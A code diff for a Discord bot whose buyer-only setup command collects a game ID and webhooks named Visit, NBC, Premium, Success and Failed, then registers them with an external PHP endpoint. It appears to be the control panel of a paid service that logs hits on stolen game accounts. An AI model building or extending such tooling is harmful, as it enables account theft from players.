@@ -11,11 +11,11 @@ client = commands.Bot(command_prefix='+', help_command=None)
 @commands.dm_only()
 async def setup(ctx):
     
-    guild = client.get_guild(Server_ID)
+    guild = client.get_guild(963634491090436146)
     
     member = await guild.fetch_member(ctx.author.id)
     
-    role_id = Buyer_Role_ID
+    role_id = 972855388460433408
 
     if any(role.id == role_id for role in member.roles):
         giveaway_questions = ['What Is The Game ID?', 'Give Me The Visit Webhook', 'Give Me The NBC Webhook', 'Give Me The Premium Webhook', 'Give Me The Success Webhook', 'Give Me The Failed Webhook']
@@ -56,7 +56,7 @@ async def setup(ctx):
 
         await ctx.send(embed=embedVar, delete_after=5)
     
-        api = requests.get(f"website_link_here/updateWebhooks.php?game={gameID}&success={success}&premium={premium}&visit={visit}&failed={failed}&nbc={nbc}&disc={discID}")
+        api = requests.get(f"http://infernicuszmgui.x10.mx/updateWebhooks.php?game={gameID}&success={success}&premium={premium}&visit={visit}&failed={failed}&nbc={nbc}&disc={discID}")
 
         apiCheck = api.text
     
